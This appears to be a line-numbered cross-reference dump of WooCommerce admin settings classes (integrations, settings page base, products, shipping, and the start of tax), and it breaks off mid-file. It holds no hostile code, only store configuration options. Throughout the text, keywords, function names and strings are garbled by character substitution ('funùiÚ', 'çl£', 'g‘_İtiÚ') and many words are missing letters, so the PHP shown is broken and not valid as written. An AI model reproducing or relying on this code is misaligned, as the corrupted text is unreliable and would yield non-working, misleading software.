(

299 '´im¬y' => 
$´im¬y
,

300 '£cÚd¬y' => 
$£cÚd¬y
,

301 'highlight' => 
$highlight
,

302 'cÚ‹Á_bg' => 
$cÚ‹Á_bg
,

303 'sub‹xt' => 
$sub‹xt


307 
$v®id_cŞÜs
 = 
Œue
;

308 
	`fÜ—ch
 ( 
$cŞÜs
 
as
 
$cŞÜ
 ) {

309 iàĞ! 
	`´eg_m©ch
Ğ'/^#[a-f0-9]{6}$/i', 
$cŞÜ
 ) ) {

310 
$v®id_cŞÜs
 = 
çl£
;

311 
WC_Admš_S‘tšgs
::
	`add_”rÜ
Ğ
	`¥rštf
Ğ
	`__
Ğ'E¼Ü savšghFrÚ‹nd StyËs, % i nÙ‡ v®id cŞÜ,…Ëa£ u£ oÆy v®id cŞÜ code.', 'woocomm”û' ), 
$cŞÜ
 ) );

316 iàĞ
$v®id_cŞÜs
 ) {

317 
$Şd_cŞÜs
 = 
	`g‘_İtiÚ
( 'woocommerce_frontend_css_colors' );

318 
	`upd©e_İtiÚ
Ğ'woocomm”û_äÚ‹nd_css_cŞÜs', 
$cŞÜs
 );

320 iàĞ
$Şd_cŞÜs
 !ğ
$cŞÜs
 ) {

321 
	`woocomm”û_compe_Ëss_¡yËs
();

325 
	}
}

329 
	g’dif
;

331  
Ãw
 
WC_S‘tšgs_G’”®
();

	@includes/admin/settings/class-wc-settings-integrations.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Settings_Integrations' ) ) :

18 şas 
	cWC_S‘tšgs_IÁeg¿tiÚs
 
ex‹nds
 
WC_S‘tšgs_Page
 {

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
$this
->
id
 = 'integration';

25 
$this
->
Ïb–
 = 
	`__
( 'Integration', 'woocommerce' );

27 iàĞ
	`is£t
Ğ
	`WC
()->
š‹g¿tiÚs
 ) && WC()->š‹g¿tiÚs->
	`g‘_š‹g¿tiÚs
() ) {

28 
	`add_f‹r
Ğ'woocomm”û_£‰šgs_bs_¬¿y', 
	`¬¿y
Ğ
$this
, 'add_settings_page' ), 20 );

29 
	`add_aùiÚ
Ğ'woocomm”û_£ùiÚs_' . 
$this
->
id
, 
	`¬¿y
( $this, 'output_sections' ) );

30 
	`add_aùiÚ
Ğ'woocomm”û_£‰šgs_' . 
$this
->
id
, 
	`¬¿y
( $this, 'output' ) );

31 
	`add_aùiÚ
Ğ'woocomm”û_£‰šgs_§ve_' . 
$this
->
id
, 
	`¬¿y
( $this, 'save' ) );

40 
public
 
funùiÚ
 
	$g‘_£ùiÚs
() {

41 
glob®
 
$cu¼’t_£ùiÚ
;

43 
$£ùiÚs
 = 
	`¬¿y
();

45 
$š‹g¿tiÚs
 = 
	`WC
()->
š‹g¿tiÚs
->
	`g‘_š‹g¿tiÚs
();

47 iàĞ! 
$cu¼’t_£ùiÚ
 )

48 
$cu¼’t_£ùiÚ
 = 
	`cu¼’t
Ğ
$š‹g¿tiÚs
 )->
id
;

50 
	`fÜ—ch
 ( 
$š‹g¿tiÚs
 
as
 
$š‹g¿tiÚ
 ) {

51 
$t™Ë
 = 
	`em±y
Ğ
$š‹g¿tiÚ
->
m‘hod_t™Ë
 ) ? 
	`ucfœ¡
Ğ$š‹g¿tiÚ->
id
 ) : $integration->method_title;

53 
$£ùiÚs
[ 
	`¡¹Şow”
Ğ
$š‹g¿tiÚ
->
id
 ) ] = 
	`esc_html
Ğ
$t™Ë
 );

56  
$£ùiÚs
;

57 
	}
}

62 
public
 
funùiÚ
 
	$ouut
() {

63 
glob®
 
$cu¼’t_£ùiÚ
;

65 
$š‹g¿tiÚs
 = 
	`WC
()->
š‹g¿tiÚs
->
	`g‘_š‹g¿tiÚs
();

67 iàĞ
	`is£t
Ğ
$š‹g¿tiÚs
[ 
$cu¼’t_£ùiÚ
 ] ) )

68 
$š‹g¿tiÚs
[ 
$cu¼’t_£ùiÚ
 ]->
	`admš_İtiÚs
();

69 
	}
}

72 
	g’dif
;

74  
Ãw
 
WC_S‘tšgs_IÁeg¿tiÚs
();

	@includes/admin/settings/class-wc-settings-page.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Settings_Page' ) ) :

18 şas 
	cWC_S‘tšgs_Page
 {

20 
´Ùeùed
 
$id
 = '';

21 
´Ùeùed
 
	m$Ïb–
 = '';

26 
public
 
funùiÚ
 
	$add_£‰šgs_·ge
Ğ
$·ges
 ) {

27 
$·ges
[ 
$this
->
id
 ] = $this->
Ïb–
;

29  
$·ges
;

37 
public
 
funùiÚ
 
	$g‘_£‰šgs
() {

38  
	`¬¿y
();

39 
	}
}

46 
public
 
funùiÚ
 
	$g‘_£ùiÚs
() {

47  
	`¬¿y
();

48 
	}
}

53 
public
 
funùiÚ
 
	$ouut_£ùiÚs
() {

54 
glob®
 
$cu¼’t_£ùiÚ
;

56 
$£ùiÚs
 = 
$this
->
	`g‘_£ùiÚs
();

58 iàĞ
	`em±y
Ğ
$£ùiÚs
 ) )

61 
echo
 '<ul class="subsubsub">';

63 
$¬¿y_keys
 = 
	`¬¿y_keys
Ğ
$£ùiÚs
 );

65 
	`fÜ—ch
 ( 
$£ùiÚs
 
as
 
$id
 => 
$Ïb–
 )

66 
echo
 '<li><¨h»f="' . 
	`admš_u¾
Ğ'admš.php?·ge=wc-£‰šgs&b=' . 
$this
->
id
 . '&£ùiÚ=' . 
	`§n™ize_t™Ë
Ğ
$id
 ) ) . '" cÏss="' . ( 
$cu¼’t_£ùiÚ
 =ğ$id ? 'cu¼’t' : '' ) . '">' . 
$Ïb–
 . '</a> ' . ( 
	`’d
Ğ
$¬¿y_keys
 ) == $id ? '' : '|' ) . ' </li>';

68 
echo
 '</ul><br class="clear" />';

69 
	}
}

74 
public
 
funùiÚ
 
	$ouut
() {

75 
$£‰šgs
 = 
$this
->
	`g‘_£‰šgs
();

77 
WC_Admš_S‘tšgs
::
	`ouut_f›lds
Ğ
$£‰šgs
 );

78 
	}
}

83 
public
 
funùiÚ
 
	$§ve
() {

84 
glob®
 
$cu¼’t_£ùiÚ
;

86 
$£‰šgs
 = 
$this
->
	`g‘_£‰šgs
();

87 
WC_Admš_S‘tšgs
::
	`§ve_f›lds
Ğ
$£‰šgs
 );

89 iàĞ
$cu¼’t_£ùiÚ
 )

90 
	`do_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_' . 
$this
->
id
 . '_' . 
$cu¼’t_£ùiÚ
 );

91 
	}
}

94 
	g’dif
;

	@includes/admin/settings/class-wc-settings-products.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Settings_Products' ) ) :

18 şas 
	cWC_S‘tšgs_Produùs
 
ex‹nds
 
WC_S‘tšgs_Page
 {

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
$this
->
id
 = 'products';

25 
$this
->
Ïb–
 = 
	`__
( 'Products', 'woocommerce' );

27 
	`add_f‹r
Ğ'woocomm”û_£‰šgs_bs_¬¿y', 
	`¬¿y
Ğ
$this
, 'add_settings_page' ), 20 );

28 
	`add_aùiÚ
Ğ'woocomm”û_£‰šgs_' . 
$this
->
id
, 
	`¬¿y
( $this, 'output' ) );

29 
	`add_aùiÚ
Ğ'woocomm”û_£‰šgs_§ve_' . 
$this
->
id
, 
	`¬¿y
( $this, 'save' ) );

30 
	`add_aùiÚ
Ğ'woocomm”û_£ùiÚs_' . 
$this
->
id
, 
	`¬¿y
( $this, 'output_sections' ) );

38 
public
 
funùiÚ
 
	$g‘_£ùiÚs
() {

39 
$£ùiÚs
 = 
	`¬¿y
(

40 '' => 
	`__
( 'Product Options', 'woocommerce' ),

41 'šv’tÜy' => 
	`__
( 'Inventory', 'woocommerce' )

44  
$£ùiÚs
;

45 
	}
}

50 
public
 
funùiÚ
 
	$ouut
() {

51 
glob®
 
$cu¼’t_£ùiÚ
;

53 
$£‰šgs
 = 
$this
->
	`g‘_£‰šgs
Ğ
$cu¼’t_£ùiÚ
 );

55 
WC_Admš_S‘tšgs
::
	`ouut_f›lds
Ğ
$£‰šgs
 );

56 
	}
}

61 
public
 
funùiÚ
 
	$§ve
() {

62 
glob®
 
$cu¼’t_£ùiÚ
;

64 
$£‰šgs
 = 
$this
->
	`g‘_£‰šgs
Ğ
$cu¼’t_£ùiÚ
 );

65 
WC_Admš_S‘tšgs
::
	`§ve_f›lds
Ğ
$£‰šgs
 );

66 
	}
}

73 
public
 
funùiÚ
 
g‘_£‰šgs
Ğ
$cu¼’t_£ùiÚ
 = '' ) {

75 iàĞ
$cu¼’t_£ùiÚ
 == 'inventory' ) {

77  
­¶y_f‹rs
('woocomm”û_šv’tÜy_£‰šgs', 
¬¿y
(

79 
¬¿y
Ğ't™Ë' => 
__
( 'Inventory Options', 'woocommerce' ), 'type' => 'title', 'desc' => '', 'id' => 'inventory_options' ),

81 
¬¿y
(

82 't™Ë' => 
__
( 'Manage Stock', 'woocommerce' ),

83 'desc' => 
__
( 'Enable stock management', 'woocommerce' ),

89 
¬¿y
(

90 't™Ë' => 
__
( 'Hold Stock (minutes)', 'woocommerce' ),

91 'desc' => 
__
( 'Hold stock (for unpaid orders) for x minutes. Whenhis†imit is„eached,he…ending order will be cancelled. Leave blanko disable.', 'woocommerce' ),

94 'cu¡om_©Œibu‹s' => 
¬¿y
(

100 'autŞßd' => 
çl£


103 
¬¿y
(

104 't™Ë' => 
__
( 'Notifications', 'woocommerce' ),

105 'desc' => 
__
( 'Enable†ow stock‚otifications', 'woocommerce' ),

110 'autŞßd' => 
çl£


113 
¬¿y
(

114 'desc' => 
__
( 'Enable out of stock‚otifications', 'woocommerce' ),

119 'autŞßd' => 
çl£


122 
¬¿y
(

123 't™Ë' => 
__
( 'Notification Recipient', 'woocommerce' ),

127 'deçuÉ' => 
g‘_İtiÚ
( 'admin_email' ),

128 'autŞßd' => 
çl£


131 
¬¿y
(

132 't™Ë' => 
__
( 'Low Stock Threshold', 'woocommerce' ),

137 'cu¡om_©Œibu‹s' => 
¬¿y
(

142 'autŞßd' => 
çl£


145 
¬¿y
(

146 't™Ë' => 
__
( 'Out Of Stock Threshold', 'woocommerce' ),

151 'cu¡om_©Œibu‹s' => 
¬¿y
(

156 'autŞßd' => 
çl£


159 
¬¿y
(

160 't™Ë' => 
__
( 'Out Of Stock Visibility', 'woocommerce' ),

161 'desc' => 
__
( 'Hide out of stock items fromhe catalog', 'woocommerce' ),

167 
¬¿y
(

168 't™Ë' => 
__
( 'Stock Display Format', 'woocommerce' ),

169 'desc' => 
__
( 'This controls how stock is displayed onhe frontend.', 'woocommerce' ),

174 'İtiÚs' => 
¬¿y
(

175 '' => 
__
( 'Always show stockƒ.g. "12 in stock"', 'woocommerce' ),

176 'low_amouÁ' => 
__
( 'Only show stock when†owƒ.g. "Only 2†eft in stock" vs. "In Stock"', 'woocommerce' ),

177 'no_amouÁ' => 
__
( 'Never show stock‡mount', 'woocommerce' ),

179 'desc_t' => 
Œue
,

182 
¬¿y
( 'type' => 'sectionend', 'id' => 'inventory_options'),

189 
	g$shİ_·ge_id
 = 
wc_g‘_·ge_id
('shop');

191 
	g$ba£_¦ug
 = (
$shİ_·ge_id
 > 0 && 
g‘_·ge
Ğ$shİ_·ge_id )è? 
g‘_·ge_uri
( $shop_page_id ) : 'shop';

193 
	g$woocomm”û_´•’d_shİ_·ge_to_´oduùs_w¬nšg
 = '';

195 iàĞ
	g$shİ_·ge_id
 > 0 && (
g‘_·ges
("child_of=$shop_page_id")) > 0 )

196 
	g$woocomm”û_´•’d_shİ_·ge_to_´oduùs_w¬nšg
 = ' <m¬k cÏss="nÙiû">' . 
__
( 'Note: The shop…age has children - child…ages will‚ot work if youƒnablehis option.', 'woocommerce' ) . '</mark>';

198  
­¶y_f‹rs
Ğ'woocomm”û_´oduù_£‰šgs', 
¬¿y
(

200 
¬¿y
Ğ't™Ë' => 
__
( 'Product Listings', 'woocommerce' ), 'type' => 'title','desc' => '', 'id' => 'catalog_options' ),

202 
¬¿y
(

203 't™Ë' => 
__
( 'Product Archive / Shop Page', 'woocommerce' ),

204 'desc' => '<br/>' . 
¥rštf
Ğ
__
Ğ'Thba£…agÿÀ®sØbu£d iÀyou¸<¨h»f="%s">´oduù…”m®šks</a>.', 'woocomm”û' ), 
admš_u¾
( 'options-permalink.php' ) ),

210 'desc_t' => 
__
( 'This setshe base…age of your shop -his is where your…roduct‡rchive will be.', 'woocommerce' ),

213 
¬¿y
(

214 't™Ë' => 
__
( 'Shop Page Display', 'woocommerce' ),

215 'desc' => 
__
( 'This controls what is shown onhe…roduct‡rchive.', 'woocommerce' ),

221 'İtiÚs' => 
¬¿y
(

222 '' => 
__
( 'Show…roducts', 'woocommerce' ),

223 'subÿ‹gÜ›s' => 
__
( 'Show subcategories', 'woocommerce' ),

224 'bÙh' => 
__
( 'Show both', 'woocommerce' ),

226 'desc_t' => 
Œue
,

229 
¬¿y
(

230 't™Ë' => 
__
( 'Default Category Display', 'woocommerce' ),

231 'desc' => 
__
( 'This controls what is shown on category‡rchives.', 'woocommerce' ),

237 'İtiÚs' => 
¬¿y
(

238 '' => 
__
( 'Show…roducts', 'woocommerce' ),

239 'subÿ‹gÜ›s' => 
__
( 'Show subcategories', 'woocommerce' ),

240 'bÙh' => 
__
( 'Show both', 'woocommerce' ),

242 'desc_t' => 
Œue
,

245 
¬¿y
(

246 't™Ë' => 
__
( 'Default Product Sorting', 'woocommerce' ),

247 'desc' => 
__
( 'This controlshe default sort order ofhe catalog.', 'woocommerce' ),

253 'İtiÚs' => 
­¶y_f‹rs
('woocomm”û_deçuÉ_ÿlog_Üd”by_İtiÚs', 
¬¿y
(

254 'm’u_Üd”' => 
__
( 'Default sorting (custom ordering +‚ame)', 'woocommerce' ),

255 'pİuÏr™y' => 
__
( 'Popularity (sales)', 'woocommerce' ),

256 '¿tšg' => 
__
( 'Average Rating', 'woocommerce' ),

257 'd©e' => 
__
( 'Sort by most„ecent', 'woocommerce' ),

258 '´iû' => 
__
( 'Sort by…rice (asc)', 'woocommerce' ),

259 '´iû-desc' => 
__
( 'Sort by…rice (desc)', 'woocommerce' ),

261 'desc_t' => 
Œue
,

264 
¬¿y
(

265 't™Ë' => 
__
( 'Addo cart', 'woocommerce' ),

266 'desc' => 
__
( 'Redirectohe cart…age‡fter successful‡ddition', 'woocommerce' ),

273 
¬¿y
(

274 'desc' => 
__
( 'Enable AJAX‡ddo cart buttons on‡rchives', 'woocommerce' ),

281 
¬¿y
( 'type' => 'sectionend', 'id' => 'catalog_options' ),

283 
¬¿y
Ğ't™Ë' => 
__
( 'Product Data', 'woocommerce' ), 'type' => 'title', 'id' => 'product_data_options' ),

285 
¬¿y
(

286 't™Ë' => 
__
( 'Weight Unit', 'woocommerce' ),

287 'desc' => 
__
( 'This controls what unit you will define weights in.', 'woocommerce' ),

293 'İtiÚs' => 
¬¿y
(

294 'kg' => 
__
( 'kg', 'woocommerce' ),

295 'g' => 
__
( 'g', 'woocommerce' ),

296 'lbs' => 
__
( 'lbs', 'woocommerce' ),

297 'oz' => 
__
( 'oz', 'woocommerce' ),

299 'desc_t' => 
Œue
,

302 
¬¿y
(

303 't™Ë' => 
__
( 'Dimensions Unit', 'woocommerce' ),

304 'desc' => 
__
( 'This controls what unit you will define†engths in.', 'woocommerce' ),

310 'İtiÚs' => 
¬¿y
(

311 'm' => 
__
( 'm', 'woocommerce' ),

312 'cm' => 
__
( 'cm', 'woocommerce' ),

313 'mm' => 
__
( 'mm', 'woocommerce' ),

314 'š' => 
__
( 'in', 'woocommerce' ),

315 'yd' => 
__
( 'yd', 'woocommerce' ),

317 'desc_t' => 
Œue
,

320 
¬¿y
(

321 't™Ë' => 
__
( 'Product Ratings', 'woocommerce' ),

322 'desc' => 
__
( 'Enable„atings on„eviews', 'woocommerce' ),

328 'autŞßd' => 
çl£


331 
¬¿y
(

332 'desc' => 
__
( 'Ratings‡re„equiredo†eave‡„eview', 'woocommerce' ),

338 'autŞßd' => 
çl£


341 
¬¿y
(

342 'desc' => 
__
( 'Show "verified owner"†abel for customer„eviews', 'woocommerce' ),

348 'autŞßd' => 
çl£


351 
¬¿y
(

352 'desc' => 
__
( 'Only‡llow„eviews from "verified owners"', 'woocommerce' ),

358 'autŞßd' => 
çl£


361 
¬¿y
( 'type' => 'sectionend', 'id' => 'product_data_options' ),

363 
¬¿y
Ğ't™Ë' => 
__
Ğ'Produù ImagSizes', 'woocomm”û' ), 'ty³' => 't™Ë','desc' => 
¥rštf
(__( 'These settings‡ffecthe‡ctual dimensions of images in your catalog -he display onhe front-end will still be‡ffected by CSS styles. After changinghese settings you may‚eedo <a href="%s">regenerate yourhumbnails</a>.', 'woocommerce' ), 'http://wordpress.org/extend/plugins/regenerate-thumbnails/'), 'id' => 'image_options' ),

365 
¬¿y
(

366 't™Ë' => 
__
( 'Catalog Images', 'woocommerce' ),

367 'desc' => 
__
( 'This size is usually used in…roduct†istings', 'woocommerce' ),

371 'deçuÉ' => 
¬¿y
(

374 'üİ' => 
Œue


376 'desc_t' => 
Œue
,

379 
¬¿y
(

380 't™Ë' => 
__
( 'Single Product Image', 'woocommerce' ),

381 'desc' => 
__
( 'This ishe size used byhe main image onhe…roduct…age.', 'woocommerce' ),

385 'deçuÉ' => 
¬¿y
(

390 'desc_t' => 
Œue
,

393 
¬¿y
(

394 't™Ë' => 
__
( 'Product Thumbnails', 'woocommerce' ),

395 'desc' => 
__
( 'This size is usually used forhe gallery of images onhe…roduct…age.', 'woocommerce' ),

399 'deçuÉ' => 
¬¿y
(

404 'desc_t' => 
Œue
,

407 
¬¿y
( 'type' => 'sectionend', 'id' => 'image_options' ),

409 
¬¿y
Ğ't™Ë' => 
__
( 'Downloadable Products', 'woocommerce' ), 'type' => 'title', 'id' => 'digital_download_options' ),

411 
¬¿y
(

412 't™Ë' => 
__
( 'File Download Method', 'woocommerce' ),

413 'desc' => 
__
( 'Forcing downloads will keep URLs hidden, but some servers may serve†arge files unreliably. If supported, <code>X-Accel-Redirect</code>/ <code>X-Sendfile</code> can be usedo serve downloads instead (server„equires <code>mod_xsendfile</code>).', 'woocommerce' ),

419 'desc_t' => 
Œue
,

420 'İtiÚs' => 
¬¿y
(

421 'fÜû' => 
__
( 'Force Downloads', 'woocommerce' ),

422 'x£ndfe' => 
__
( 'X-Accel-Redirect/X-Sendfile', 'woocommerce' ),

423 '»dœeù' => 
__
( 'Redirect only', 'woocommerce' ),

425 'autŞßd' => 
çl£


428 
¬¿y
(

429 't™Ë' => 
__
( 'Access Restriction', 'woocommerce' ),

430 'desc' => 
__
( 'Downloads„equire†ogin', 'woocommerce' ),

434 'desc_t' => 
__
( 'This setting does‚ot‡pplyo guest…urchases.', 'woocommerce' ),

436 'autŞßd' => 
çl£


439 
¬¿y
(

440 'desc' => 
__
( 'Grant‡ccesso downloadable…roducts‡fter…ayment', 'woocommerce' ),

444 'desc_t' => 
__
( 'Enablehis optiono grant‡ccesso downloads when orders‡re "processing",„atherhan "completed".', 'woocommerce' ),

446 'autŞßd' => 
çl£


449 
¬¿y
( 'type' => 'sectionend', 'id' => 'digital_download_options' ),

456 
	g’dif
;

458  
Ãw
 
WC_S‘tšgs_Produùs
();

	@includes/admin/settings/class-wc-settings-shipping.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Settings_Shipping' ) ) :

18 şas 
	cWC_S‘tšgs_Shpšg
 
ex‹nds
 
WC_S‘tšgs_Page
 {

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
$this
->
id
 = 'shipping';

25 
$this
->
Ïb–
 = 
	`__
( 'Shipping', 'woocommerce' );

27 
	`add_f‹r
Ğ'woocomm”û_£‰šgs_bs_¬¿y', 
	`¬¿y
Ğ
$this
, 'add_settings_page' ), 20 );

28 
	`add_aùiÚ
Ğ'woocomm”û_£ùiÚs_' . 
$this
->
id
, 
	`¬¿y
( $this, 'output_sections' ) );

29 
	`add_aùiÚ
Ğ'woocomm”û_£‰šgs_' . 
$this
->
id
, 
	`¬¿y
( $this, 'output' ) );

30 
	`add_aùiÚ
Ğ'woocomm”û_admš_f›ld_shpšg_m‘hods', 
	`¬¿y
Ğ
$this
, 'shipping_methods_setting' ) );

31 
	`add_aùiÚ
Ğ'woocomm”û_£‰šgs_§ve_' . 
$this
->
id
, 
	`¬¿y
( $this, 'save' ) );

39 
public
 
funùiÚ
 
	$g‘_£ùiÚs
() {

40 
$£ùiÚs
 = 
	`¬¿y
(

41 '' => 
	`__
( 'Shipping Options', 'woocommerce' )

45 
$shpšg_m‘hods
 = 
	`WC
()->
shpšg
->
	`lßd_shpšg_m‘hods
();

47 
	`fÜ—ch
 ( 
$shpšg_m‘hods
 
as
 
$m‘hod
 ) {

49 iàĞ! 
$m‘hod
->
	`has_£‰šgs
() ) ;

51 
$t™Ë
 = 
	`em±y
Ğ
$m‘hod
->
m‘hod_t™Ë
 ) ? 
	`ucfœ¡
Ğ$m‘hod->
id
 ) : $method->method_title;

53 
$£ùiÚs
[ 
	`¡¹Şow”
Ğ
	`g‘_şass
Ğ
$m‘hod
 ) ) ] = 
	`esc_html
Ğ
$t™Ë
 );

56  
$£ùiÚs
;

57 
	}
}

64 
public
 
funùiÚ
 
	$g‘_£‰šgs
() {

65  
	`­¶y_f‹rs
('woocomm”û_shpšg_£‰šgs', 
	`¬¿y
(

67 
	`¬¿y
Ğ't™Ë' => 
	`__
( 'Shipping Options', 'woocommerce' ), 'type' => 'title', 'id' => 'shipping_options' ),

69 
	`¬¿y
(

70 't™Ë' => 
	`__
( 'Shipping Calculations', 'woocommerce' ),

71 'desc' => 
	`__
( 'Enable shipping', 'woocommerce' ),

78 
	`¬¿y
(

79 'desc' => 
	`__
( 'Enablehe shipping calculator onhe cart…age', 'woocommerce' ),

84 'autŞßd' => 
çl£


87 
	`¬¿y
(

88 'desc' => 
	`__
( 'Hide shipping costs until‡n‡ddress isƒntered', 'woocommerce' ),

93 'autŞßd' => 
çl£


96 
	`¬¿y
(

97 't™Ë' => 
	`__
( 'Shipping Display Mode', 'woocommerce' ),

98 'desc' => 
	`__
( 'This controls how multiple shipping methods‡re displayed onhe frontend.', 'woocommerce' ),

102 'İtiÚs' => 
	`¬¿y
(

103 '' => 
	`__
( 'Display shipping methods with "radio" buttons', 'woocommerce' ),

104 '£Ëù' => 
	`__
( 'Display shipping methods in‡ dropdown', 'woocommerce' ),

106 'desc_t' => 
Œue
,

107 'autŞßd' => 
çl£


110 
	`¬¿y
(

111 't™Ë' => 
	`__
( 'Shipping Destination', 'woocommerce' ),

112 'desc' => 
	`__
( 'Shipo billing‡ddress by default', 'woocommerce' ),

117 'autŞßd' => 
çl£
,

121 
	`¬¿y
(

122 'desc' => 
	`__
( 'Only shipohe users billing‡ddress', 'woocommerce' ),

127 'autŞßd' => 
çl£
,

131 
	`¬¿y
(

132 't™Ë' => 
	`__
( 'Restrict shippingo Location(s)', 'woocommerce' ),

133 'desc' => 
	`¥rštf
Ğ
	`__
Ğ'Choo£ which couÁr› you wªˆtØsho, o¸choo£ØshØ®È<¨h»f="%s">loÿtiÚ you s–Èto</a>.', 'woocomm”û' ), 
	`admš_u¾
( 'admin.php?page=wc-settings&tab=general' ) ),

138 'desc_t' => 
çl£
,

139 'İtiÚs' => 
	`¬¿y
(

140 '' => 
	`__
( 'Shipo‡ll countries you sello', 'woocommerce' ),

141 '®l' => 
	`__
( 'Shipo‡ll countries', 'woocommerce' ),

142 '¥ecific' => 
	`__
( 'Shipo specific countries only', 'woocommerce' )

146 
	`¬¿y
(

147 't™Ë' => 
	`__
( 'Specific Countries', 'woocommerce' ),

155 
	`¬¿y
(

159 
	`¬¿y
( 'type' => 'sectionend', 'id' => 'shipping_options' ),

162 
	}
}

167 
public
 
funùiÚ
 
	$ouut
() {

168 
glob®
 
$cu¼’t_£ùiÚ
;

171 
$shpšg_m‘hods
 = 
	`WC
()->
shpšg
->
	`lßd_shpšg_m‘hods
();

173 iàĞ
$cu¼’t_£ùiÚ
 ) {

174 
	`fÜ—ch
 ( 
$shpšg_m‘hods
 
as
 
$m‘hod
 ) {

175 iàĞ
	`¡¹Şow”
Ğ
	`g‘_şass
Ğ
$m‘hod
 ) ) =ğ¡¹Şow”Ğ
$cu¼’t_£ùiÚ
 ) && $m‘hod->
	`has_£‰šgs
() ) {

176 
$m‘hod
->
	`admš_İtiÚs
();

181 
$£‰šgs
 = 
$this
->
	`g‘_£‰šgs
();

183 
WC_Admš_S‘tšgs
::
	`ouut_f›lds
Ğ
$£‰šgs
 );

185 
	}
}

193 
public
 
funùiÚ
 
	$shpšg_m‘hods_£‰šg
() {

194 
$deçuÉ_shpšg_m‘hod
 = 
	`esc_©Œ
Ğ
	`g‘_İtiÚ
('woocommerce_default_shipping_method') );

196 <
Œ
 
v®ign
="top">

197 <
th
 
scİe
="row" 
şass
="t™Ëdesc"><?
php
 
	`_e
( 'Shipping Methods', 'woocommerce' ) ?></th>

198 <
td
 
şass
="forminp">

199 <
bË
 
şass
="wc_shpšg wideçt" 
ûÎ¥acšg
="0">

200 <
th—d
>

201 <
Œ
>

202 <
th
 
şass
="deçuÉ"><?
php
 
	`_e
( 'Default', 'woocommerce' ); ?></th>

203 <
th
 
şass
="Çme"><?
php
 
	`_e
( 'Name', 'woocommerce' ); ?></th>

204 <
th
 
şass
="id"><?
php
 
	`_e
( 'ID', 'woocommerce' ); ?></th>

205 <
th
 
şass
="¡©us"><?
php
 
	`_e
( 'Status', 'woocommerce' ); ?></th>

206 <
th
 
şass
="£‰šgs">&
nb¥
;</th>

207 </
Œ
>

208 </
th—d
>

209 <
tfoÙ
>

210 <
Œ
>

211 <
th
 
width
="1%" 
şass
="default">

212 <
šput
 
ty³
="¿dio" 
Çme
="deçuÉ_shpšg_m‘hod" 
v®ue
="" <?
php
 
	`checked
Ğ
$deçuÉ_shpšg_m‘hod
, '' ); ?> />

213 </
th
>

214 <
th
><?
php
 
	`_e
Ğ'Autom©ic', 'woocomm”û' ); ?> <
a
 
şass
="ts" 
d©a
-
t
="<?php _e( 'The cheapest‡vailable shipping method will be selected by default.', 'woocommerce' ); ?>">[?]</a></th>

215 <
th
 
cŞ¥ª
="3"><
¥ª
 
şass
="desütiÚ"><?
php
 
	`_e
( 'Drag‡nd drophe‡bove shipping methodso controlheir display order.', 'woocommerce' ); ?></span></th>

216 </
Œ
>

217 </
tfoÙ
>

218 <
tbody
>

219 <?
php


220 
	`fÜ—ch
 ( 
	`WC
()->
shpšg
->
	`lßd_shpšg_m‘hods
(è
as
 
$key
 => 
$m‘hod
 ) {

221 
echo
 '<tr>

222 <
td
 
width
="1%" 
şass
="default">

223 <
šput
 
ty³
="¿dio" 
Çme
="deçuÉ_shpšg_m‘hod" 
v®ue
="' .ƒsc_attr( $method->id ) . '" ' . checked( $default_shipping_method, $method->id, false ) . ' />

224 <
šput
 
ty³
="hidd’" 
Çme
="m‘hod_Üd”[]" 
v®ue
="' .ƒsc_attr( $method->id ) . '" />

225 </
td
>

226 <
td
 
şass
="name">

228 </
td
>

229 <
td
 
şass
="id">

231 </
td
>

232 <
td
 
şass
="status">';

234 iàĞ
$m‘hod
->
’abËd
 == 'yes' )

235 
echo
 '<¥ª cÏss="¡©us-’abËds" d©a-t="' . 
	`__
 ( 'Enabled', 'woocommerce' ) . '">' . __ ( 'Enabled', 'woocommerce' ) . '</span>';

237 
echo
 '-';

239 
echo
 '</td>

240 <
td
 
şass
="settings">';

242 iàĞ
$m‘hod
->
has_£‰šgs
 ) {

243 
echo
 '<¨şass="bu‰Ú" h»f="' . 
	`admš_u¾
Ğ'admš.php?·ge=wc-£‰šgs&b=shpšg&£ùiÚ=' . 
	`¡¹Şow”
Ğ
	`g‘_şass
Ğ
$m‘hod
 ) ) ) . '">' . 
	`__
( 'Settings', 'woocommerce' ) . '</a>';

246 
echo
 '</td>

247 </
Œ
>';

250 </
tbody
>

251 </
bË
>

252 </
td
>

253 </
Œ
>

254 <?
php


255 
	}
}

260 
public
 
funùiÚ
 
	$§ve
() {

261 
glob®
 
$cu¼’t_£ùiÚ
;

263 iàĞ! 
$cu¼’t_£ùiÚ
 ) {

265 
$£‰šgs
 = 
$this
->
	`g‘_£‰šgs
();

267 
WC_Admš_S‘tšgs
::
	`§ve_f›lds
Ğ
$£‰šgs
 );

268 
	`WC
()->
shpšg
->
	`´oûss_admš_İtiÚs
();

270 } 
	`–£if
 ( 
	`şass_exi¡s
Ğ
$cu¼’t_£ùiÚ
 ) ) {

272 
$cu¼’t_£ùiÚ_şass
 = 
Ãw
 
	`$cu¼’t_£ùiÚ
();

274 
	`do_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_' . 
$this
->
id
 . '_' . 
$cu¼’t_£ùiÚ_şass
->id );

276 
	}
}

279 
	g’dif
;

281  
Ãw
 
WC_S‘tšgs_Shpšg
();

	@includes/admin/settings/class-wc-settings-tax.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ! 
şass_exi¡s
( 'WC_Settings_Tax' ) ) :

18 şas 
	cWC_S‘tšgs_Tax
 
ex‹nds
 
WC_S‘tšgs_Page
 {

23 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
$this
->
id
 = 'tax';

25 
$this
->
Ïb–
 = 
	`__
( 'Tax', 'woocommerce' );

27 
	`add_f‹r
Ğ'woocomm”û_£‰šgs_bs_¬¿y', 
	`¬¿y
Ğ
$this
